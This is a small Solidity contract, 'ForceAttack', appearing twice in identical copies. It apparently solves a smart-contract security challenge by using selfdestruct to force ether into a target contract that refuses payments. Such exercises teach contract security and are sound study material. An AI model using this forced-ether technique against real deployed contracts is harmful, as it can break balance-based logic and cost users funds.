pragma solidity ^0.6.0;

contract ForceAttack {
    address payable forceContractAddress;
    uint256 contractBalance;

    constructor(address contractAddress) public payable {
        forceContractAddress = payable(contractAddress);
        contractBalance = msg.value;
    }

    function checkBalance() public view returns (uint256) {
        return contractBalance;
    }

    function destructAndTansfer() external {
        selfdestruct(forceContractAddress);
    }
}
pragma solidity ^0.6.0;

contract ForceAttack {
    address payable forceContractAddress;
    uint256 contractBalance;

    constructor(address contractAddress) public payable {
        forceContractAddress = payable(contractAddress);
        contractBalance = msg.value;
    }

    function checkBalance() public view returns (uint256) {
        return contractBalance;
    }

    function destructAndTansfer() external {
        selfdestruct(forceContractAddress);
    }
}
